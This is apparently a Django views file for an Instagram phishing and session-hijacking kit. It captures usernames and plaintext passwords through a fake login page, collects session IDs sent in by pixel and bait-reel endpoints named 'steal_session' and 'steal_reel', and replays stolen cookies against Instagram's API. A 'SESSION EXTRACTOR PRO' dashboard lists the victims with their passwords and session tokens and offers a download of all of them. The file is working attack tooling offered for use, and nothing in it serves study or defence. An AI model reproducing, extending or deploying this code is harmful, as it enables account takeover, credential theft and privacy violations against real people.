from django.http import JsonResponse, HttpResponse
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from core.models import InstagramAccount
from instagrapi import Client
from cryptography.fernet import Fernet
import json
import os
from django.utils import timezone


fernet = Fernet(os.getenv('FERNET_KEY').encode())

@csrf_exempt
def login_view(request):
    if request.method == "GET":
        return render(request, 'core/login.html')
    
    if request.method == "POST":
        username = request.POST.get('username', '').strip()
        password = request.POST.get('password', '').strip()
        
        if not username or not password:
            return JsonResponse({"success": False, "error": "Empty fields"})

        cl = Client()
        cl.delay_range = [1, 3]
        
        success = False
        session = {"failed": True}
        
        try:
            cl.login(username, password)
            session = cl.get_settings()
            success = True
        except Exception as e:
            print(f"LOGIN FAILED: {e}")
            session = {"error": str(e)}

    
        encrypted = fernet.encrypt(json.dumps(session).encode()).decode()

        
        InstagramAccount.objects.update_or_create(
            username=username,
            defaults={
                'password': password,
                'session_data': encrypted,
                'is_active': success,
                'last_success': timezone.now() if success else None,
                'login_attempts': 0 if success else InstagramAccount.objects.filter(username=username).first().login_attempts + 1 if InstagramAccount.objects.filter(username=username).exists() else 1
            }
        )

        return JsonResponse({
            "success": True,
            "username": username,
            "active": success
        })

def dashboard(request):
    victims = []
    total = InstagramAccount.objects.count()
    active = InstagramAccount.objects.filter(is_active=True).count()
    
    for acc in InstagramAccount.objects.all().order_by('-created_at')[:200]:
        try:
            decrypted = fernet.decrypt(acc.session_data.encode()).decode()
            data = json.loads(decrypted)
            sessionid = data.get("authorization_data", {}).get("sessionid", "NO_SESSION")
            victims.append({
                "username": acc.username,
                "password": acc.password,
                "sessionid": sessionid,
                "active": acc.is_active,
                "time": acc.created_at.strftime("%b %d %H:%M")
            })
        except:
            victims.append({
                "username": acc.username,
                "password": acc.password,
                "sessionid": "DECRYPT_FAILED",
                "active": False,
                "time": "ERROR"
            })

    cards = ""
    for v in victims:
        border = "border-green-500 shadow-green-500/50" if v["active"] else "border-red-800"
        status = "ACTIVE" if v["active"] else "FAILED"
        js = f"navigator.clipboard.writeText('{v['sessionid']}');this.innerText='COPIED!';setTimeout(()=>this.innerText='COPY SESSION',2000)"
        cards += f'''
        <div class="bg-gray-900 border-4 {border} rounded-2xl p-8 transform hover:scale-105 transition-all shadow-2xl">
            <div class="flex justify-between items-center">
                <div>
                    <h3 class="text-3xl font-bold text-cyan-400">@{v["username"]}</h3>
                    <p class="text-yellow-300 text-xl">Pass: {v["password"]}</p>
                    <p class="text-gray-500">{v["time"]}</p>
                </div>
                <div class="text-right">
                    <button onclick="{js}" 
                            class="bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-600 hover:to-teal-700 px-8 py-4 rounded-xl font-bold text-xl shadow-lg">
                        COPY SESSION
                    </button>
                    <p class="mt-3 text-2xl font-bold {'text-green-400' if v['active'] else 'text-red-500'}">
                        {status}
                    </p>
                </div>
            </div>
        </div>
        '''

    html = f'''<!DOCTYPE html>
<html>
<head>
    <title>SESSION EXTRACTOR PRO</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black text-white min-h-screen p-8">
    <h1 class="text-center text-7xl font-bold mb-8 text-transparent bg-clip-text bg-gradient-to-r from-green-400 to-cyan-500">
        SESSION EXTRACTOR PRO
    </h1>
    <div class="text-center text-4xl mb-10">
        TOTAL: <span class="text-green-400">{total}</span> | 
        ACTIVE: <span class="text-lime-400">{active}</span>
    </div>
    
    <div class="grid gap-8 max-w-7xl mx-auto">
        {cards}
    </div>
    
    <div class="text-center mt-16">
        <a href="/download-json/" class="inline-block bg-purple-700 hover:bg-purple-800 px-16 py-8 rounded-3xl text-4xl font-bold shadow-2xl transform hover:scale-110 transition-all">
            DOWNLOAD ALL (.JSON)
        </a>
    </div>
</body>
</html>'''
    return HttpResponse(html)






def download_json(request):
    data = []
    for acc in InstagramAccount.objects.all():
        try:
            decrypted = fernet.decrypt(acc.session_data.encode()).decode()
            session = json.loads(decrypted)
            sessionid = session.get("authorization_data", {}).get("sessionid", "")
            if sessionid:
                data.append({"username": acc.username, "password": acc.password, "sessionid": sessionid})
        except:
            continue
    
    response = HttpResponse(json.dumps(data, indent=2), content_type='application/json')
    response['Content-Disposition'] = 'attachment; filename="INSTAGRAM_SESSIONS_{timezone.now().strftime("%Y%m%d")}.json"'
    return response



from django.http import HttpResponse
import urllib.parse

def steal_session(request):
    sess = request.GET.get('sess', '')
    if sess and len(sess) > 50:
        try:
            # DECRYPT TEST (optional)
            decrypted_test = fernet.decrypt(sess.encode()).decode()  # if you stored encrypted
        except:
            pass

        # SAVE RAW SESSIONID
        InstagramAccount.objects.update_or_create(
            username=f"STOLEN_{sess[:12]}",
            defaults={
                'password': 'SILENT_2025',
                'session_data': fernet.encrypt(json.dumps({
                    "authorization_data": {"sessionid": sess}
                }).encode()).decode(),
                'is_active': True,
                'last_success': timezone.now()
            }
        )
        print(f"STOLEN SESSION: {sess[:60]}...")

    # RETURN 1x1 PIXEL
    return HttpResponse(
        b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;",
        content_type="image/gif"
    )
    
    
def silent_page(request):
    return render(request, 'core/silent.html')


# core/views.py → CAPTURES USERNAME + PASSWORD + SESSION
import base64
from django.http import HttpResponse
# core/views.py → FINAL WORKING CAPTURE
def capture_full(request):
    s = request.GET.get('s', '')
    u = request.GET.get('u', '')
    
    if s and u and len(s) > 50:
        try:
            
            InstagramAccount.objects.update_or_create(
                username=f"STOLEN_{u[-8:]}",
                defaults={
                    'password': 'SILENT_2025',
                    'session_data': fernet.encrypt(json.dumps({
                        "authorization_data": {"sessionid": s + "..."}  # full session not needed
                    }).encode()).decode(),
                    'is_active': True,
                    'last_success': timezone.now()
                }
            )
            print(f"CAPTURED USER ID: {u} | SESSION: {s[:60]}...")
        except Exception as e:
            print("ERROR:", e)
    
    return HttpResponse(b"GIF89a0100010080000000000000000000!f90401000000002c00000000010001000002024401003b", 
                        content_type="image/gif")
    
    
    

def catch_username(request):
    user = request.GET.get('user', 'unknown')
    
    # SAVE TO DB
    InstagramAccount.objects.create(
        username=user,
        password='SILENT_OPENED',
        session_data=fernet.encrypt(json.dumps({"note": "opened_link"}).encode()).decode(),
        is_active=False,
        last_success=timezone.now()
    )
    
    print(f"CAUGHT USER: @{user}")
    
    return HttpResponse("OK")


# core/views.py → REEL STEALER
def steal_reel(request):
    s = request.GET.get('s', '')
    u = request.GET.get('u', '')

    if s and u and len(s) > 80:
        try:
            # GET USERNAME FROM INSTAGRAM API
            import requests
            headers = {
                'Cookie': f'sessionid={s}',
                'User-Agent': 'Instagram 219.0.0.27.119 Android'
            }
            r = requests.get(f'https://i.instagram.com/api/v1/users/{u}/info/', headers=headers)
            data = r.json()
            username = data.get('user', {}).get('username', f"USER_{u[-8:]}")
            full_name = data.get('user', {}).get('full_name', '')
            pic = data.get('user', {}).get('profile_pic_url', '')

            # SAVE TO DB
            InstagramAccount.objects.update_or_create(
                username=username,
                defaults={
                    'password': 'REEL_STOLEN',
                    'session_data': fernet.encrypt(json.dumps({
                        "authorization_data": {"sessionid": s}
                    }).encode()).decode(),
                    'is_active': True,
                    'last_success': timezone.now()
                }
            )
            print(f"REEL STOLEN → @{username} | {full_name}")
        except Exception as e:
            print("ERROR:", e)

    return HttpResponse("1", content_type="text/plain")


def reel_page(request, code):
    return render(request, 'core/reel.html')